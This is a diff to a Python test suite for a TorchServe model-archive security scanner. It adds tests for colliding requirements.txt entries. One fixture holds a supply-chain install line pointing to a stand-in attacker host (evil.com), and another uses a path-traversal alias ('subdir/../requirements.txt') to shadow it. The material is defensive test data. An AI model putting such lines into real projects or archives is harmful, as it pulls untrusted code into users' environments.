@@ -6,6 +6,7 @@ import ast
 import json
 import pickle
 import zipfile
+from collections.abc import Mapping, Sequence
 from pathlib import Path
 from typing import Any, cast
 
@@ -20,7 +21,7 @@ from modelaudit.scanners.zip_scanner import ZipScanner
 def _create_mar_archive(
     tmp_path: Path,
     manifest: dict[str, Any] | str | None,
-    entries: dict[str, bytes],
+    entries: Mapping[str, bytes] | Sequence[tuple[str, bytes]],
     filename: str = "model.mar",
     compression: int = zipfile.ZIP_STORED,
 ) -> Path:
@@ -36,7 +37,8 @@ def _create_mar_archive(
             )
             archive.writestr("MAR-INF/MANIFEST.json", manifest_bytes)
 
-        for name, data in entries.items():
+        archive_entries = entries.items() if isinstance(entries, Mapping) else entries
+        for name, data in archive_entries:
             archive.writestr(name, data)
 
     return mar_path
@@ -977,6 +979,51 @@ def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
 
     assert len(requirements_checks) == 1
     assert requirements_checks[0].status == CheckStatus.PASSED
+
+
+def test_scan_flags_colliding_requirements_txt_member_even_when_benign_alias_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
+        ],
+        filename="requirements_collision_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "requirements.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_accepts_clean_colliding_requirements_txt_aliases(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"numpy==1.26.4\n"),
+            ("subdir/../requirements.txt", b"torch==2.2.2\n"),
+        ],
+        filename="requirements_collision_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 2
+    assert all(check.status == CheckStatus.PASSED for check in requirements_checks)
 
 
 def test_scan_ignores_inline_comment_urls_in_safe_requirements(tmp_path: Path) -> None:
